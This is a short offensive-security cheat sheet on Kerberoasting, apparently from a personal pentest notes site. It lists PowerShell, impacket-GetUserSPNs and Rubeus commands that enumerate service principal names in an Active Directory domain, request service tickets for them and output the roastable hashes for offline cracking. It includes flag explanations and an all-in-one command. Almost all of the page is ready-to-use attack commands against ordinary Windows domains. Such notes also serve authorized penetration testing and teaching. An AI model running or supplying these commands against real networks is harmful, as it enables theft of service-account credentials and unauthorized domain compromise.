# Kerberoasting

{% embed url="https://www.techcrafters.com/portal/en/kb/articles/how-to-list-all-spns-in-a-domain-using-powershell#2__Querying_SPNs" %}

{% embed url="https://github.com/GhostPack/Rubeus?tab=readme-ov-file#roasting" %}

...



### Retrieve a list of SPNs in the network

1. `Get-ADServiceAccount` cmdlet

{% code overflow="wrap" %}
```powershell
PS> Get-ADServiceAccount -Filter 'ServicePrincipalNames -like "*"' | Select-Object -ExpandProperty ServicePrincipalNames
```
{% endcode %}

2. Impacket-scripts: **GetUserSPNs**

{% code overflow="wrap" %}
```sh
$ impacket-GetUserSPNs -dc-ip <DOMAIN_CONTROLLER> <TARGET>
```
{% endcode %}

* `<TARGET>:` The domain user account to authenticate to the KDC with
  * By default, all domain users can read the `servicePrinicpalName` attribute (required by the script)
  * Thus, as long as a valid user account is provided, it will not affect the results of the script

### Retrieve TGS for the SPNs we have found

1. &#x20;`impacket-GetUserSPNs` with the `-request-user` flag

{% code overflow="wrap" %}
```sh
$ impacket-GetUserSPNs -dc-ip <DOMAIN_CONTROLLER> <TARGET> -request-user <SERVICE_USER> 
```
{% endcode %}

* `-request-user:` Requests TGS for the SPN associated to the user specified (just the username, no domain needed)

2. `Rubeus.exe`

{% code overflow="wrap" %}
```powershell
C:\> Rubeus.exe kerberoast /spn:<SPN> /ticket:<EXISTING_TGT> 
C:\> Rubeus.exe kerberoast /user:<USERNAME> /ticket:EXISTING_TGT 
```
{% endcode %}

* `/ticket:` Specifies the TGT to use when requesting the service tickets
* `/spn:` Roasts just the specified SPN
* `/user:` Roasts just the specified user

**Other useful flags**

a. `/outfile:FILE:` outputs roasted hashes to the specified file, one per line

b. `/simple:` roasted hashes will be output to the console, one per line

**Combined command**

Or, we can directly enumerate and request for the TGS for all SPNs:

{% code overflow="wrap" %}
```powershell
C:\> Rubeus.exe kerberoast
```
{% endcode %}

